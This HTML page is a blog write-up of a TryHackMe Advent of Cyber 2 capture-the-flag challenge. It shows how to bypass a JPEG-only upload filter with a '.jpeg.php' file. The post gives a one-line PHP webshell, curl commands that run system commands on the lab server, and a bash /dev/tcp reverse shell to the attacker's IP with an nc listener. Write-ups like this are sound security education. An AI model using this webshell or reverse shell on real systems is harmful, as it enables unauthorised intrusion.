@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Advent of Cyber2 Day 0x02 :: Foxtrotlabs — In the middle of somewhere</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="0x00 Intro Another day, another challenge. The task was simple - RCE via Unrestricted File Upload. The uploaded file must be the .jpeg one, so sanitization mechanism has to be bypassed.
+0x01 Solution To get access to the upload page the id parameter is needed in the GET request.
+GET /uploads/?id=ODIzODI5MTNiYmYw HTTP/1.1 Host: 10.10.52.175 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Then there is a service to upload images of suspicious peoples hanging around." />
+<meta name="keywords" content="hacking" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/" />
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+<link rel="stylesheet" href="https://foxtrotlabs.cc/assets/style.css">
+
+  <link rel="stylesheet" href="https://foxtrotlabs.cc/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="foxtrot_0xf4ult" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Advent of Cyber2 Day 0x02 :: Foxtrotlabs">
+<meta property="og:description" content="AoC2 Day 0x02 Web Challenge solution" />
+<meta property="og:url" content="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/" />
+<meta property="og:site_name" content="Advent of Cyber2 Day 0x02" />
+
+  <meta property="og:image" content="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/title.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-12-02 18:38:59 &#43;0100 &#43;0100" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://foxtrotlabs.cc/en">
+  <div class="logo">
+    foxtrotlabs-en
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/about">about</a></li>
+        
+      
+        
+          <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://foxtrotlabs.cc/posts">posts</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/pl">Polish side</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/about">about</a></li>
+      
+    
+      
+        <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/">Advent of Cyber2 Day 0x02</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-12-02 
+      </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://foxtrotlabs.cc/tags/http/">http</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/web/">web</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/exploitation/">exploitation</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/cookies/">cookies</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/hacking/">hacking</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/easychalls/">easychalls</a>&nbsp;
+    
+    #<a href="https://foxtrotlabs.cc/tags/re/">re</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/title.png" class="post-cover" alt="Advent of Cyber2 Day 0x02" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="0x00-intro">0x00 Intro<a href="#0x00-intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Another day, another challenge. The task was simple - RCE via Unrestricted File Upload. The uploaded file must be the <code>.jpeg</code> one, so sanitization mechanism has to be bypassed.</p>
+<h2 id="0x01-solution">0x01 Solution<a href="#0x01-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>To get access to the upload page the <code>id</code> parameter is needed in the GET request.</p>
+<pre tabindex="0"><code>GET /uploads/?id=ODIzODI5MTNiYmYw HTTP/1.1
+Host: 10.10.52.175
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+</code></pre><p>Then there is a service to upload images of suspicious peoples hanging around. Hopefully GPDR&rsquo;s rules don&rsquo;t apply here, we want to have Christmas, right?</p>
+<p><img src="./uploadarena.png" alt="uploadingarena"></p>
+<p>Uploading is restricted to <code>jpeg</code> files only.</p>
+<p><img src="./file_restrictions.png" alt="uploadingpassed"></p>
+<p>But the only thing that matters is something with the file extension itself.</p>
+<p><img src="./file_restrictions_passed.png" alt="uploadingpassed2"></p>
+<p><em>Notice the difference in the extension.</em></p>
+<p><img src="./file_restrictions2.png" alt="uploadingnotpassed"></p>
+<p>So even though the <code>mime</code> value and <code>body</code> payload is marked as image or base64 encoded image data the upload doesn&rsquo;t succeed.</p>
+<p>Although even <code>txt</code> payloads with the <code>.jpeg</code> extension pass the checks.</p>
+<p><img src="./bypassed.png" alt="bypassed"></p>
+<p>The simplest webshell I can think of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Uploading a PHP webshell with the <code>.jpeg.php</code> extension is successful. The only one thing left is to reach this file via the HTTP server that will execute the PHP code.</p>
+<p>To find the <code>upload</code> folders, before running the <code>ffuf</code> or another fuzzer/dirbuster software, it&rsquo;s a good idea to try some common names. In this case files were stored in the <code>/uploads/</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ curl -si <span style="color:#e6db74">&#34;http://10.10.245.201/uploads/shell.jpeg.php?cmd=id&#34;</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Wed, <span style="color:#ae81ff">02</span> Dec <span style="color:#ae81ff">2020</span> 19:33:21 GMT
+Server: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span>
+X-Powered-By: PHP/7.2.24
+Transfer-Encoding: chunked
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+
+uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span>
+</code></pre></div><p>Low priv account <code>apache</code> of the server grants rights to read directory content of the <code>/uploads/</code> folder and parent directories.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ curl -si <span style="color:#e6db74">&#34;http://10.10.245.201/uploads/shell.jpeg.php?cmd=ls+-la+../&#34;</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Wed, <span style="color:#ae81ff">02</span> Dec <span style="color:#ae81ff">2020</span> 19:35:15 GMT
+Server: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span>
+X-Powered-By: PHP/7.2.24
+Transfer-Encoding: chunked
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+
+total <span style="color:#ae81ff">36</span>
+drwxr-xr-x  <span style="color:#ae81ff">4</span> root   root    <span style="color:#ae81ff">196</span> Nov <span style="color:#ae81ff">19</span> 03:17 .
+drwxr-xr-x. <span style="color:#ae81ff">4</span> root   root     <span style="color:#ae81ff">49</span> Nov <span style="color:#ae81ff">19</span> 11:14 ..
+drwxr-xr-x  <span style="color:#ae81ff">6</span> root   root     <span style="color:#ae81ff">51</span> Nov <span style="color:#ae81ff">19</span> 02:45 assets
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">874</span> Nov <span style="color:#ae81ff">19</span> 02:12 auth.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">365</span> Nov <span style="color:#ae81ff">19</span> 02:48 cover.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root   <span style="color:#ae81ff">1150</span> Nov <span style="color:#ae81ff">19</span> 02:48 favicon.ico
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">192</span> Nov <span style="color:#ae81ff">19</span> 02:29 get-ids.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root   <span style="color:#ae81ff">2448</span> Nov <span style="color:#ae81ff">16</span> 18:35 id-list
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">412</span> Nov <span style="color:#ae81ff">19</span> 03:09 index.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">406</span> Nov <span style="color:#ae81ff">19</span> 02:12 lightrope.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root    <span style="color:#ae81ff">513</span> Nov <span style="color:#ae81ff">19</span> 00:17 preauth.php
+-rw-r--r--  <span style="color:#ae81ff">1</span> root   root   <span style="color:#ae81ff">1146</span> Nov <span style="color:#ae81ff">19</span> 02:31 upload.php
+drwxrwxrwx  <span style="color:#ae81ff">2</span> apache apache   <span style="color:#ae81ff">62</span> Dec  <span style="color:#ae81ff">2</span> 14:31 uploads
+</code></pre></div><p>And&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ curl -si <span style="color:#e6db74">&#34;http://10.10.245.201/uploads/shell.jpeg.php?cmd=ls+-la+../../&#34;</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Wed, <span style="color:#ae81ff">02</span> Dec <span style="color:#ae81ff">2020</span> 19:35:43 GMT
+Server: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span>
+X-Powered-By: PHP/7.2.24
+Transfer-Encoding: chunked
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x.  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">49</span> Nov <span style="color:#ae81ff">19</span> 11:14 .
+drwxr-xr-x. <span style="color:#ae81ff">21</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 17:50 ..
+drwxr-xr-x.  <span style="color:#ae81ff">2</span> root root    <span style="color:#ae81ff">6</span> Sep <span style="color:#ae81ff">15</span> 11:46 cgi-bin
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">635</span> Nov <span style="color:#ae81ff">19</span> 11:14 flag.txt
+drwxr-xr-x   <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">196</span> Nov <span style="color:#ae81ff">19</span> 03:17 html
+</code></pre></div><p>There is our flag and the message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ curl -si <span style="color:#e6db74">&#34;http://10.10.245.201/uploads/shell.jpeg.php?cmd=cat+../../flag.txt&#34;</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Wed, <span style="color:#ae81ff">02</span> Dec <span style="color:#ae81ff">2020</span> 19:36:14 GMT
+Server: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span>
+X-Powered-By: PHP/7.2.24
+Transfer-Encoding: chunked
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+
+
+
+<span style="color:#f92672">==============================================================</span>
+
+
+You<span style="color:#e6db74">&#39;ve reached the end of the Advent of Cyber, Day 2 -- hopefully you&#39;</span>re enjoying yourself so far, and are learning lots! 
+This is all from me, so I<span style="color:#e6db74">&#39;m going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Have a flag -- you deserve it!
+</span><span style="color:#e6db74">THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Good luck on your mission (and maybe I&#39;</span>ll see y<span style="color:#960050;background-color:#1e0010">&#39;</span>all again on Christmas Eve<span style="color:#f92672">)</span>!
+ --Muiri <span style="color:#f92672">(</span>@MuirlandOracle<span style="color:#f92672">)</span>
+
+
+<span style="color:#f92672">==============================================================</span>
+
+</code></pre></div><p>Of course instead of uploading the webshell one can use a reverse shell and connect back from the machine. Or invoke the reverse shell from this one like this:</p>
+<p>(listener)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">8089</span>
+</code></pre></div><p>(command to invoke revshell)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ curl -si <span style="color:#e6db74">&#34;http://10.10.245.201/uploads/shell.jpeg.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.137.15%2F8089%200%3E%261%0A&#34;</span>
+</code></pre></div><p>And done:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─○ nc -lvp <span style="color:#ae81ff">8089</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8089</span> ...
+10.10.245.201: inverse host lookup failed: Unknown host
+connect to <span style="color:#f92672">[</span>10.8.137.15<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.245.201<span style="color:#f92672">]</span> <span style="color:#ae81ff">58702</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>833<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+bash-4.4$ ls
+ls
+bj.jpeg
+bj.jpeg.txt
+shell.jpeg.php
+bash-4.4$ uname -a
+uname -a
+Linux security-server 4.18.0-193.28.1.el8_2.x86_64 <span style="color:#75715e">#1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+bash-4.4$ id
+id
+uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span>
+</code></pre></div><p>It was as simple as that!</p>
+<p>C u tomorrow!</p>
+<p><code>foxtrot_charlie over and out</code></p>
+
+      </div></div>
+
+  
+
+  <link rel="stylesheet" href="https://foxtrotlabs.cc/comments.css">
+ <section class="post-comments">
+  <script src='https://www.google.com/recaptcha/api.js'></script>
+ 
+
+<h1 id="Comments">Comments<a href="#Comments" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<font size="1"> My comments operate on free Heroku instance. If there is no traffic in 30 minutes the dyno service goes asleep. That causes a small delay in submitting your comment. Thank you for your patience ;)</font>
+
+  
+  
+
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+  
+    <p>Nothing yet.</p>
+  
+
+  <h3>Say something</h3>
+
+  <form class="post-new-comment" method="POST" action="https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/page_source/master/comments">
+    <input type="hidden" name="options[redirect]" value="https://foxtrotlabs.cc/2020/12/advent-of-cyber2-day-0x02/#comment-submitted">
+    <input type="hidden" name="options[entryId]" value="bf195914194cd42d6c56f0c93e5853b0">
+    <input name="fields[name]" type="text" class="post-comment-field" placeholder="Your name">
+    <input name="fields[email]" type="email" class="post-comment-field" placeholder="Your email address">
+    <textarea name="fields[body]" class="post-comment-field" placeholder="Your message. Feel free to use Markdown." rows="10"></textarea>
+    <input type="hidden" name="options[reCaptcha][siteKey]" value="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR">
+    <input type="hidden" name="options[reCaptcha][secret]" value="cNVL1K9Iu23KHkq4nAvjE8jFHYmFb1aJmvpOSSILJdZaUA07HolAG0UkqYzekmBKkxqNo4bAwKcPhGtIohOKp+PfBROWHhB+Vl+lGYQ9Z3+MTghdzhAZEC0V+Ti0WEvpfTXR7Lj6LUXwPNg+HRMj3/oYlou6vsz0cP1OSLPe9iMd4ZMGolwIaUowvWn9DVfU0eHKLAWUNXVRxFiBGcTKKbAd0JgR4ZtZs1VsPkhC3OlOsHm/yW2pA491SAQ0s820p+H1SncOd1kYE1h2gTL+oklzH+5CNz2V4xyq6Et4NLjinr0WGUN87eCFYUz+05wyEp+5lrG+uuq1eX2cBcfVoA=="></div>
+    <input type="submit" class="post-comment-field btn" value="Submit">
+     <div class="g-recaptcha" data-sitekey="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR"></div>
+  </form>
+</section>
+
+<div id="comment-submitted" class="dialog">
+<h3>Thank you</h3>
+  <p>Your comment has been submitted and will be published once it has been approved.</p>
+  <p><a href="#" class="btn">OK</a></p>
+</div>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>copyright by foxtrot_charlie</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://foxtrotlabs.cc/assets/main.js"></script>
+<script src="https://foxtrotlabs.cc/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
